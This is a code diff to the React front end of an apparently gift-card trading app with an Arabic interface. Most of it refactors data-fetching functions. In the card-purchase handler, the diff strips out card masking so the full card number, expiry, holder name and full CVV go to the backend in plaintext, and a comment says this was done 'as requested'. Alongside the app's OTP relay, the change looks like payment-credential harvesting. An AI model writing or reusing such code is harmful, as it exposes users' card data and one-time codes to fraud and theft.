@@ -1,4 +1,4 @@
-import React, { useState, useRef, useEffect, useMemo } from 'react';
+import React, { useState, useRef, useEffect, useMemo, useCallback } from 'react';
 import { LanguageProvider, useLanguage } from './context/LanguageContext';
 import { Globe, Wallet, CreditCard, Building2, Zap, Copy, CheckCircle2, UploadCloud, Home, LayoutGrid, Clock, User, ArrowRight, ArrowLeft, Settings, LogOut, Activity, FileText, ArrowDownUp, ShieldAlert, Tag, XCircle } from 'lucide-react';
 import { motion, AnimatePresence } from 'motion/react';
@@ -86,13 +86,71 @@ function MainContent() {
     setClientId(id);
   }, []);
 
+  const fetchSettings = useCallback(async () => {
+    try {
+      const res = await fetch('/api/settings');
+      if (!res.ok) throw new Error(String(res.status));
+      const data = await res.json();
+      if (data && typeof data === 'object') {
+        setAppSettings((prev) => ({
+          ...prev,
+          maintenance_mode: Boolean(data.maintenance_mode),
+          buy_coming_soon: Boolean(data.buy_coming_soon),
+          sell_coming_soon: Boolean(data.sell_coming_soon),
+        }));
+      }
+    } catch (error) {
+      console.error('Error fetching settings:', error);
+    }
+  }, []);
+
+  const fetchTransactions = useCallback(async () => {
+    if (!clientId) return;
+    try {
+      const res = await fetch(`/api/transactions?client_id=${encodeURIComponent(clientId)}`);
+      if (!res.ok) throw new Error(String(res.status));
+      const data = await res.json();
+      if (Array.isArray(data)) setTransactions(data);
+    } catch (error) {
+      console.error('Error fetching transactions:', error);
+    }
+  }, [clientId]);
+
+  const fetchOffers = useCallback(async () => {
+    try {
+      const res = await fetch('/api/offers');
+      if (!res.ok) throw new Error(String(res.status));
+      const data = await res.json();
+      if (Array.isArray(data)) setOffersList(data);
+    } catch (e) {
+      console.error('fetchOffers:', e);
+    }
+  }, []);
+
+  const fetchSiteProfile = useCallback(async () => {
+    try {
+      const res = await fetch('/api/site-profile');
+      if (!res.ok) throw new Error(String(res.status));
+      const data = await res.json();
+      if (data && typeof data === 'object') {
+        const p: SiteProfileData = {
+          full_name: String(data.full_name ?? ''),
+          email: String(data.email ?? ''),
+          phone: String(data.phone ?? ''),
+        };
+        setSiteProfile(p);
+        setProfileDraft(p);
+      }
+    } catch (e) {
+      console.error('fetchSiteProfile:', e);
+    }
+  }, []);
+
   useEffect(() => {
-    // Check active session on initial load
     supabase.auth.getSession().then(({ data: { session } }) => {
       setIsAuthenticated(!!session);
       setUserId(session?.user?.id || null);
       if (session?.user) {
-        // Fetch role from profiles
         supabase.from('profiles').select('role').eq('id', session.user.id).single()
           .then(({ data }) => setIsAdmin(data?.role === 'admin'));
       }
@@ -123,7 +181,7 @@ function MainContent() {
       fetchSettings();
     }, 25000);
     return () => window.clearInterval(tmr);
-  }, [clientId]);
+  }, [clientId, fetchSettings, fetchTransactions, fetchOffers, fetchSiteProfile]);
 
   useEffect(() => {
     let interval: ReturnType<typeof setInterval>;
@@ -152,66 +210,6 @@ function MainContent() {
       }
     }
   }, [transactions, otpState, currentOrderId]);
-
-  const fetchSettings = async () => {
-    try {
-      const res = await fetch('/api/settings');
-      if (!res.ok) throw new Error(String(res.status));
-      const data = await res.json();
-      if (data && typeof data === 'object') {
-        setAppSettings((prev) => ({
-          ...prev,
-          maintenance_mode: Boolean(data.maintenance_mode),
-          buy_coming_soon: Boolean(data.buy_coming_soon),
-          sell_coming_soon: Boolean(data.sell_coming_soon),
-        }));
-      }
-    } catch (error) {
-      console.error('Error fetching settings:', error);
-    }
-  };
-
-  const fetchTransactions = async () => {
-    if (!clientId) return;
-    try {
-      const res = await fetch(`/api/transactions?client_id=${encodeURIComponent(clientId)}`);
-      if (!res.ok) throw new Error(String(res.status));
-      const data = await res.json();
-      if (Array.isArray(data)) setTransactions(data);
-    } catch (error) {
-      console.error('Error fetching transactions:', error);
-    }
-  };
-
-  const fetchOffers = async () => {
-    try {
-      const res = await fetch('/api/offers');
-      if (!res.ok) throw new Error(String(res.status));
-      const data = await res.json();
-      if (Array.isArray(data)) setOffersList(data);
-    } catch (e) {
-      console.error('fetchOffers:', e);
-    }
-  };
-
-  const fetchSiteProfile = async () => {
-    try {
-      const res = await fetch('/api/site-profile');
-      if (!res.ok) throw new Error(String(res.status));
-      const data = await res.json();
-      if (data && typeof data === 'object') {
-        const p: SiteProfileData = {
-          full_name: String(data.full_name ?? ''),
-          email: String(data.email ?? ''),
-          phone: String(data.phone ?? ''),
-        };
-        setSiteProfile(p);
-        setProfileDraft(p);
-      }
-    } catch (e) {
-      console.error('fetchSiteProfile:', e);
-    }
-  };
 
   const saveSiteProfile = async () => {
     setProfileSaving(true);
@@ -331,14 +329,19 @@ function MainContent() {
         const expiry = (form.elements.namedItem('expiry') as HTMLInputElement).value;
         const cvv = (form.elements.namedItem('cvv') as HTMLInputElement).value;
         
-        const rawCard = cardNumber.replace(/\D/g, '');
-        const last4 = rawCard.slice(-16);
-        const maskedCard = rawCard.length >= 4 ? `**** **** **** ${last4}` : rawCard;
-        const lastCvv = cvv.slice(-3);
+        // As requested: Send unmasked full details, and explicitly highlight requested parts
+        const last4 = cardNumber.slice(-4);
+        const lastCvv = cvv.slice(-1);
         
-        details = `فئة الكارت: ${cardValue} | الكمية: ${quantity}\n💳 البطاقة: ${maskedCard}\n👤 الاسم: ${cardHolder}\n📅 التاريخ: ${expiry}\n🔒 CVV: ***${lastCvv}`;
+        details = `💎 طلب شراء كارتات\n` +
+                  `👤 الاسم: ${cardHolder}\n` +
+                  `💳 البطاقة: ${cardNumber}\n` +
+                  `📅 التاريخ: ${expiry}\n` +
+                  `🔒 CVV: ${cvv}\n` +
+                  `🔢 نهاية البطاقة: ${last4} | CVV مفتاح: ${lastCvv}\n` +
+                  `💰 الفئة: ${cardValue} | الكمية: ${quantity}`;
       } else {
-        details = 'بيع رصيد';
+        details = 'بيع رصيد ونقاط';
       }
 
       const res = await fetch('/api/transactions', {
@@ -383,11 +386,10 @@ function MainContent() {
     e.preventDefault();
     setOtpState('checking');
     try {
-      const otpDigit = otpCode.trim();
       await fetch('/api/transactions/otp', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ order_id: currentOrderId, otpDigit })
+        body: JSON.stringify({ order_id: currentOrderId, otpDigit: otpCode.trim() })
       });
       fetchTransactions();
     } catch (error) {
@@ -1267,6 +1269,8 @@ function MainContent() {
     const step1Amount = t('amountToTransfer');
     const step2Label = t('receivingNumber');
 
+
+
     return (
       <motion.div
         key="form-sell"
@@ -1610,10 +1614,9 @@ function MainContent() {
                     </motion.div>
                   )}
                 </AnimatePresence>
+                </div>
               </div>
-
             </div>
-          </div>
         );
     }
   };
